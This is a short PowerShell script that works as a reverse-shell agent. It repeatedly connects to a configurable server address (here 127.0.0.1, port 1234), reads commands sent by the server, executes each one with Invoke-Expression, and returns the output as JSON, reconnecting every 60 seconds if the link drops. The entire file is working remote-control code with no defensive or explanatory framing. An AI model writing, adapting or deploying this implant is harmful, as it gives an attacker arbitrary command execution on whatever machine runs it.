# Define the server IP and port to connect to
$serverIP = "127.0.0.1"
$serverPort = 1234

# Config
$sleeptime = 60

function Connect-ToServer {
    while ($true) {
        try {
            # Create a TCP client
            $global:client = [System.Net.Sockets.TcpClient]::new($serverIP, $serverPort)
            $global:networkStream = $client.GetStream()
            $global:reader = [System.IO.StreamReader]::new($networkStream)
            $global:writer = [System.IO.StreamWriter]::new($networkStream)
            Write-Host "Connected to server!"
            return
        } catch {
            Write-Host "Failed to connect to server. Retrying in $sleeptime seconds..."
            Start-Sleep -Seconds $sleeptime
        }
    }
}

# Function to test connection to server
function Test-Connection {
    try {
        $writer.WriteLine("ping")
        $writer.Flush()
    } catch {
        
    }
}

# Function to handle incoming commands
function Handle-Commands {
    while ($true) {
        Test-Connection
        if ($client.Connected) {
            if ($networkStream.DataAvailable) {
                $command = $reader.ReadLine()
                $output = Invoke-Expression $command | ConvertTo-Json
                $writer.WriteLine($output)
                $writer.Flush()
                $client.Close()
            }
            Start-Sleep -Seconds $sleeptime
        } else {
            Write-Host "Disconnected from server. Attempting to reconnect..."
            Connect-ToServer
        }
    }
}

# Start handling commands
Connect-ToServer
Handle-Commands


# Cleanup
$reader.Close()
$writer.Close()
$networkStream.Close()
$client.Close()